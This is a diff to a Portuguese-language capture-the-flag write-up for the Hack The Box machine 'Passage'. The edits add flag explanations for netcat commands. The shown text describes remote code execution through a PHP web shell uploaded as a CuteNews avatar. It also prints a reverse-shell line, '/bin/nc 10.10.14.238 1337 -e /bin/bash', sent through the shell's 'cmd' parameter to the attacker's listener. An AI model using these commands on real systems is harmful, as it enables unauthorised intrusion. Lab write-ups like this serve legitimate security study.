@@ -125,7 +125,7 @@ Podemos perceber que a requisição foi bem sucedida(200)
 Agora basta acessarmos nosso arquivo para poder executar comandos no servidor, para isso vamos até o diretório de arquivos: http://passage.htb/CuteNews/uploads/avatar_chu_chu.php 
 ![Image](https://i.imgur.com/AXunvx1.png)
 
-Conseguimos acessar nosso arquivo, agora podemos passar comandos pelo parametro pré definido, em meu caso 'cmd'.
+Conseguimos acessar nosso arquivo, agora podemos passar comandos do Linux pelo parametro pré definido, em meu caso 'cmd'.
 Com isso temos uma execução de código remoto :D
 ![Image](https://i.imgur.com/RU7sxGJ.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -143,12 +143,17 @@ Vamos abrir uma porta em nossa máquina.
 ![Image](https://i.imgur.com/55Noqa6.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 nc -vvnlp 1337
+_vv: verbose 2
+_-n: nodns
+_-l: listen
+_-p: port
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora vamos enviar a conexão com o netcat
 ![Image](https://i.imgur.com/IrydT8Z.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=/bin/nc 10.10.14.238 1337 -e /bin/bash
+_-e: exec 'command'
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ![Image](https://i.imgur.com/FswUPdW.png)
